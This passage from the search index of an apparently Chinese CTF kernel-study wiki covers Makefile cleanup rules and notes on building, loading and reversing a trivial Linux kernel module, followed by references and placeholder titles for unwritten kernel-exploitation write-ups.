@make clear clear: @rm -f *.o *.cmd *.mod.c @rm -rf *~ core .depend .tmp_versions Module.symvers modules.order -f @rm -f .*ko.cmd .*.o.cmd .*.o.d @rm -f *.unsigned clean: @rm -f c1.ko \u628a\u5185\u6838\u6a21\u5757\u7684\u4ee3\u7801\u653e\u7f6e\u5728c1.c\u4e2d\uff0c\u7136\u540emake\uff0c\u5982\u4e0a\u56fe\u6240\u793a\uff0c\u6267\u884c\u5b8c\u6210\u540e\uff0c\u5c31\u53ef\u4ee5\u5f97\u5230ko\u6587\u4ef6\u3002\u63a5\u4e0b\u6765\u53ef\u4ee5dmesg\u67e5\u770bLinux\u5185\u6838\u7684\u6253\u5370\u4fe1\u606f\uff0cdmesg -c\u5c06\u4f1a\u6e05\u9664\u4e4b\u524dLinux\u5185\u6838\u7684\u6253\u5370\u4fe1\u606f\u3002\u5982\u56fe\u4e0b\u6240\u793a\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528insmod\u5b89\u88c5\u6a21\u5757\uff0c\u7136\u540e\u4f7f\u7528dmesg\u67e5\u770b\u5185\u6838\u6253\u5370\u7684\u4fe1\u606f\uff1b\u7136\u540e\u4f7f\u7528lsmod\u53ef\u4ee5\u770b\u5230\u5185\u6838\u5b89\u88c5\u7684\u6a21\u5757\uff1b\u6700\u540e\u4f7f\u7528rmmod\u5378\u8f7d\u6a21\u5757\uff0c\u7136\u540e\u518d\u6b21\u4f7f\u7528dmesg\u67e5\u770b\u5185\u6838\u6253\u5370\u7684\u4fe1\u606f\u3002 \u5bf9\u7f16\u8bd1\u597d\u7684ko\u6587\u4ef6\u8fdb\u884c\u9006\u5411\uff0c\u5982\u4e0b\u56fe\u6240\u793a\uff0c\u53ea\u6709\u7b80\u5355\u76844\u4e2a\u51fd\u6570\uff0cinit\u51fd\u6570\u4e2d\u9996\u5148\u6267\u884c\u4e86\u4e00\u4e2afunction entry\uff08\u7528\u6765\u505afunction tracing\u7684\uff0c\u63d2\u6869\uff09\uff0c\u7136\u540e\u5c31\u662fprintk\uff1bexit\u51fd\u6570\u4e2d\u53ea\u6267\u884c\u4e86printk\u3002 \u4e0a\u8ff0\u7684\u4ee3\u7801: https://github.com/beafb1b1/challenges/tree/master/kernelstudy","title":"\u7f16\u5199\u548c\u5206\u6790\u4e00\u4e2aKernel\u7a0b\u5e8f"},{"location":"kernel/linux_kernel_base/#reference","text":"https://github.com/ctf-wiki/ctf-wiki/blob/master/docs/pwn/linux/kernel/ref/13_lecture.pdf https://ctf-wiki.github.io/ctf-wiki/ https://www.kernel.org/doc/html/latest/core-api/kernel-api.html https://zh.wikipedia.org/wiki/\u5185\u6838 http://www.freebuf.com/articles/system/54263.html https://blog.csdn.net/qq_16124631/article/details/28921361 https://blog.csdn.net/zqixiao_09/article/details/50839042 https://yq.aliyun.com/articles/53679","title":"Reference"},{"location":"kernel/qwb_2018_core_ROP/","text":"waiting","title":"QWB2018 core(ROP)"},{"location":"kernel/qwb_2018_core_ROP/#waiting","text":"","title":"waiting"},{"location":"kernel/qwb_2018_core_ret2usr/","text":"waiting","title":"QWB2018 core(ret2usr)"},{"location":"kernel/qwb_2018_core_ret2usr/#waiting","text":"","title":"waiting"},{"location":"kernel/starctf2019_hackeme_arw/","text":"waiting","title":"STARCTF2019 hackme(ARW)"},{"location":"kernel/starctf2019_hackeme_arw/#waiting","text":"","title":"waiting"}]}